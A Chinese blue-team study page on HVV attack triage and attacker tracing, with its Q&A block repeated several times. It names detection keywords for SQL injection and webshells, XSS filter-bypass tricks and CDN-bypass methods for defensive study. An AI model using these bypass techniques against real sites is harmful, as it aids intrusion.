由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#9拿到日志如何分析"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#10sql注入有哪些常见的特征"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#11xss弹窗函数和常见的xss绕过策略"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#12无文件webshell实现的方式有哪些"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#13响应状态码都有哪些"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#14发现一个sql注入告警怎么判断"},{"categories":["hvv"],"content":"\r攻击源捕获：发生网络攻击事件的时候，我们应急响应的过程中，需要通过安全设备辅助，利用IDS/IPS/态势感知/蜜罐/沙箱甚至是全流量的告警辅助的手法去获取攻击者的信息，比如攻击者开始攻击的时间、攻击的手法、利用的漏洞、攻击入口点、是否在服务器里留下后门、攻击者IP，被攻击主机等，获取此类信息不仅仅是为了后续的溯源取证，也为了后续的加固 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:2:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击源捕获"},{"categories":["hvv"],"content":"\r日志审计：服务器的安全日志、web服务日志、数据库日志、安全设备相关日志（waf日志、安全软件日志等） 与流量分析，通过异常流量分析具体攻击行为、攻击手法、攻击源地址与目的地址 服务器异常捕获，异常的文件程序。非正常用户、恶意的外部通信、异常进程、端口、计划任务、启动项、注册表、快捷方式、隐藏文件等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:3:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#日志审计"},{"categories":["hvv"],"content":"\r网络攻击溯源：可细分为追踪溯源攻击主机、追踪溯源攻击控制主机、追踪溯源攻击者、追踪溯源攻击组织机构 常用溯源分析方法包括域名/IP地址分析、入侵日志监测、全流量分析、同源分析、攻击模型分析 通过查询域名的whois信息，可以关联到攻击者部分信息，注册名，注册邮箱，注册地址，电话，注册时间，服务商等。 溯源的一般会获取到几个相关信息:攻击时间、攻击IP、攻击类型、恶意文件、受攻击的IP或域名。其中攻击IP、攻击类型、恶意文件、攻击详情是溯源分析的入手点。 通过攻击类型分析攻击详情的请求包，验证是否可以获取到攻击者相关信息，然后通过相关特征进行威胁情报查询来判断所用IP具体是代理的IP还是真实IP地址。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:4:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#网络攻击溯源"},{"categories":["hvv"],"content":"\r溯源流程：\r1、信息查询：//威胁情报平台 https://x.threatbook.cn/ //微步X情报社区 https://ti.qianxin.com/ //奇安信威胁情报平台 https://ti.360.cn/ 